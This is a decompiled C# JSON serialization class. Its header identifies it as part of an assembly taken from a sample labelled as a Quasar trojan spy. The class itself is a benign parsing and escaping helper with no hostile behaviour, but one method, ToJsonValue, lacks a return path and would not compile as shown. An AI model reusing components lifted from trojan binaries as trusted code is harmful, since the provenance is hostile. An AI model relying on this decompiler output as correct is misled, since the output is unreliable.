// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.JSON.JsonValue
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Text;

namespace NoiseMe.Drags.App.Models.JSON
{
  public abstract class JsonValue : IEnumerable
  {
    public static JsonValue Load(Stream stream) => stream != null ? JsonValue.Load((TextReader) new StreamReader(stream, true)) : throw new ArgumentNullException(nameof (stream));

    public static JsonValue Load(TextReader textReader) => textReader != null ? JsonValue.ToJsonValue<object>(new JavaScriptReader(textReader).Read()) : throw new ArgumentNullException(nameof (textReader));

    private static IEnumerable<KeyValuePair<string, JsonValue>> ToJsonPairEnumerable(
      IEnumerable<KeyValuePair<string, object>> kvpc)
    {
      foreach (KeyValuePair<string, object> keyValuePair in kvpc)
        yield return new KeyValuePair<string, JsonValue>(keyValuePair.Key, JsonValue.ToJsonValue<object>(keyValuePair.Value));
    }

    private static IEnumerable<JsonValue> ToJsonValueEnumerable(IEnumerable arr)
    {
      foreach (object ret in arr)
        yield return JsonValue.ToJsonValue<object>(ret);
    }

    public static JsonValue ToJsonValue<T>(T ret)
    {
      if ((object) ret == null)
        return (JsonValue) null;
      T obj1;
      if ((object) (obj1 = ret) is bool)
        return (JsonValue) new JsonPrimitive((bool) (object) obj1);
      T obj2;
      if ((object) (obj2 = ret) is byte)
        return (JsonValue) new JsonPrimitive((byte) (object) obj2);
      T obj3;
      if ((object) (obj3 = ret) is char)
        return (JsonValue) new JsonPrimitive((char) (object) obj3);
      if (ret is Decimal num1)
        return (JsonValue) new JsonPrimitive(num1);
      if (ret is double num2)
        return (JsonValue) new JsonPrimitive(num2);
      T obj4;
      if ((object) (obj4 = ret) is float)
        return (JsonValue) new JsonPrimitive((float) (object) obj4);
      if (ret is int num3)
        return (JsonValue) new JsonPrimitive(num3);
      if (ret is long num4)
        return (JsonValue) new JsonPrimitive(num4);
      T obj5;
      if ((object) (obj5 = ret) is sbyte)
        return (JsonValue) new JsonPrimitive((sbyte) (object) obj5);
      T obj6;
      if ((object) (obj6 = ret) is short)
        return (JsonValue) new JsonPrimitive((short) (object) obj6);
      if (ret is string str)
        return (JsonValue) new JsonPrimitive(str);
      T obj7;
      if ((object) (obj7 = ret) is uint)
        return (JsonValue) new JsonPrimitive((uint) (object) obj7);
      T obj8;
      if ((object) (obj8 = ret) is ulong)
        return (JsonValue) new JsonPrimitive((ulong) (object) obj8);
      T obj9;
      if ((object) (obj9 = ret) is ushort)
        return (JsonValue) new JsonPrimitive((ushort) (object) obj9);
      switch (ret)
      {
        case DateTime dateTime:
          return (JsonValue) new JsonPrimitive(dateTime);
        case DateTimeOffset dateTimeOffset:
          return (JsonValue) new JsonPrimitive(dateTimeOffset);
        case Guid guid:
          return (JsonValue) new JsonPrimitive(guid);
        case TimeSpan timeSpan:
          return (JsonValue) new JsonPrimitive(timeSpan);
        case Uri uri:
          return (JsonValue) new JsonPrimitive(uri);
        case IEnumerable<KeyValuePair<string, object>> kvpc2:
          return (JsonValue) new JsonObject(JsonValue.ToJsonPairEnumerable(kvpc2));
        case IEnumerable arr:
          return (JsonValue) new JsonArray(JsonValue.ToJsonValueEnumerable(arr));
        default:
          PropertyInfo[] propertyInfoArray = !((object) ret is IEnumerable) ? ret.GetType().GetProperties() : throw new NotSupportedException(string.Format("Unexpected parser return type: {0}", (object) ret.GetType()));
          Dictionary<string, object> kvpc1 = new Dictionary<string, object>();
          foreach (PropertyInfo propertyInfo in propertyInfoArray)
            kvpc1.Add(propertyInfo.Name, propertyInfo.GetValue((object) ret, (object[]) null).IsNull<object>((object) "null"));
          if (kvpc1.Count > 0)
            return (JsonValue) new JsonObject(JsonValue.ToJsonPairEnumerable((IEnumerable<KeyValuePair<string, object>>) kvpc1));
      }
    }

    public static JsonValue Parse(string jsonString) => jsonString != null ? JsonValue.Load((TextReader) new StringReader(jsonString)) : throw new ArgumentNullException(nameof (jsonString));

    public virtual int Count => throw new InvalidOperationException();

    public abstract JsonType JsonType { get; }

    public virtual JsonValue this[int index]
    {
      get => throw new InvalidOperationException();
      set => throw new InvalidOperationException();
    }

    public virtual JsonValue this[string key]
    {
      get => throw new InvalidOperationException();
      set => throw new InvalidOperationException();
    }

    public virtual bool ContainsKey(string key) => throw new InvalidOperationException();

    public virtual void Save(Stream stream, bool parsing)
    {
      if (stream == null)
        throw new ArgumentNullException(nameof (stream));
      this.Save((TextWriter) new StreamWriter(stream), parsing);
    }

    public virtual void Save(TextWriter textWriter, bool parsing)
    {
      if (textWriter == null)
        throw new ArgumentNullException(nameof (textWriter));
      this.Savepublic(textWriter, parsing);
    }

    private void Savepublic(TextWriter w, bool saving)
    {
      switch (this.JsonType)
      {
        case JsonType.String:
          if (saving)
            w.Write('"');
          w.Write(this.EscapeString(((JsonPrimitive) this).GetFormattedString()));
          if (!saving)
            break;
          w.Write('"');
          break;
        case JsonType.Object:
          w.Write('{');
          bool flag1 = false;
          foreach (KeyValuePair<string, JsonValue> keyValuePair in (JsonObject) this)
          {
            if (flag1)
              w.Write(", ");
            w.Write('"');
            w.Write(this.EscapeString(keyValuePair.Key));
            w.Write("\": ");
            if (keyValuePair.Value == null)
              w.Write("null");
            else
              keyValuePair.Value.Savepublic(w, saving);
            flag1 = true;
          }
          w.Write('}');
          break;
        case JsonType.Array:
          w.Write('[');
          bool flag2 = false;
          foreach (JsonValue jsonValue in (IEnumerable<JsonValue>) this)
          {
            if (flag2)
              w.Write(", ");
            if (jsonValue != null)
              jsonValue.Savepublic(w, saving);
            else
              w.Write("null");
            flag2 = true;
          }
          w.Write(']');
          break;
        case JsonType.Boolean:
          w.Write((bool) this ? "true" : "false");
          break;
        default:
          w.Write(((JsonPrimitive) this).GetFormattedString());
          break;
      }
    }

    public string ToString(bool saving = true)
    {
      StringWriter stringWriter = new StringWriter();
      this.Save((TextWriter) stringWriter, saving);
      return stringWriter.ToString();
    }

    IEnumerator IEnumerable.GetEnumerator() => throw new InvalidOperationException();

    private bool NeedEscape(string src, int i)
    {
      char ch = src[i];
      if (ch < ' ' || ch == '"' || ch == '\\' || ch >= '\uD800' && ch <= '\uDBFF' && (i == src.Length - 1 || src[i + 1] < '\uDC00' || src[i + 1] > '\uDFFF') || ch >= '\uDC00' && ch <= '\uDFFF' && (i == 0 || src[i - 1] < '\uD800' || src[i - 1] > '\uDBFF') || ch == '\u2028' || ch == '\u2029')
        return true;
      return ch == '/' && i > 0 && src[i - 1] == '<';
    }

    public string EscapeString(string src)
    {
      if (src == null)
        return (string) null;
      for (int index = 0; index < src.Length; ++index)
      {
        if (this.NeedEscape(src, index))
        {
          StringBuilder sb = new StringBuilder();
          if (index > 0)
            sb.Append(src, 0, index);
          return this.DoEscapeString(sb, src, index);
        }
      }
      return src;
    }

    private string DoEscapeString(StringBuilder sb, string src, int cur)
    {
      int startIndex = cur;
      for (int index = cur; index < src.Length; ++index)
      {
        if (this.NeedEscape(src, index))
        {
          sb.Append(src, startIndex, index - startIndex);
          switch (src[index])
          {
            case '\b':
              sb.Append("\\b");
              break;
            case '\t':
              sb.Append("\\t");
              break;
            case '\n':
              sb.Append("\\n");
              break;
            case '\f':
              sb.Append("\\f");
              break;
            case '\r':
              sb.Append("\\r");
              break;
            case '"':
              sb.Append("\\\"");
              break;
            case '/':
              sb.Append("\\/");
              break;
            case '\\':
              sb.Append("\\\\");
              break;
            default:
              sb.Append("\\u");
              sb.Append(((int) src[index]).ToString("x04"));
              break;
          }
          startIndex = index + 1;
        }
      }
      sb.Append(src, startIndex, src.Length - startIndex);
      return sb.ToString();
    }

    public static implicit operator JsonValue(bool value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(byte value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(char value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(Decimal value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(double value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(float value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(int value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(long value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(sbyte value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(short value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(string value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(uint value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(ulong value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(ushort value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(DateTime value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(DateTimeOffset value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(Guid value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(TimeSpan value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator JsonValue(Uri value) => (JsonValue) new JsonPrimitive(value);

    public static implicit operator bool(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToBoolean(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator byte(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToByte(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator char(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToChar(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator Decimal(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToDecimal(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator double(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToDouble(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator float(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToSingle(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator int(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToInt32(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator long(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToInt64(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator sbyte(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToSByte(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator short(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToInt16(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator string(JsonValue value) => value?.ToString(true);

    public static implicit operator uint(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToUInt32(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator ulong(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToUInt64(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator ushort(JsonValue value)
    {
      if (value == null)
        throw new ArgumentNullException(nameof (value));
      return Convert.ToUInt16(((JsonPrimitive) value).Value, (IFormatProvider) NumberFormatInfo.InvariantInfo);
    }

    public static implicit operator DateTime(JsonValue value) => value != null ? (DateTime) ((JsonPrimitive) value).Value : throw new ArgumentNullException(nameof (value));

    public static implicit operator DateTimeOffset(JsonValue value) => value != null ? (DateTimeOffset) ((JsonPrimitive) value).Value : throw new ArgumentNullException(nameof (value));

    public static implicit operator TimeSpan(JsonValue value) => value != null ? (TimeSpan) ((JsonPrimitive) value).Value : throw new ArgumentNullException(nameof (value));

    public static implicit operator Guid(JsonValue value) => value != null ? (Guid) ((JsonPrimitive) value).Value : throw new ArgumentNullException(nameof (value));

    public static implicit operator Uri(JsonValue value) => value != null ? (Uri) ((JsonPrimitive) value).Value : throw new ArgumentNullException(nameof (value));
  }
}
